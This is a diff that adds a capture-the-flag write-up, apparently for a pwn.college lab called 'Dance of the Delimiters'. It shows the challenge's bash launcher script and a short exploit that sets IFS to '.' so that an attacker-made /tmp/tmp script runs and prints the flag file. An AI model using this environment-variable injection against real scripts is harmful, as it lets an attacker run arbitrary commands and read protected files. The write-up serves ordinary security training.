@@ -217,3 +217,36 @@ $PROGRAM
 echo "cat /flag" > /tmp/tmp
 /challenge/run IFS . fortune
 ```
+
+# Dance of the Delimiters
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+WORKDIR=$(mktemp -d) || exit 1
+cd $WORKDIR
+
+echo -e "Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: $0 VARNAME VARVALUE PROGRAM"
+[ "$#" -eq 3 ] || exit 2
+
+if [ "$3" != "fortune" ]
+then
+	echo "Only 'fortune' is supported right now!"
+	exit 3
+else
+	cp /usr/games/fortune $WORKDIR
+	PROGRAM="$WORKDIR/fortune"
+fi
+
+[[ "$1" = *PROGRAM* ]] && exit 4
+declare -- "$1"="$2"
+$PROGRAM
+```
+
+### exploit
+```sh
+echo "cat /flag" > /tmp/tmp && chmod +x /tmp/tmp
+/challenge/run IFS . fortune
+```
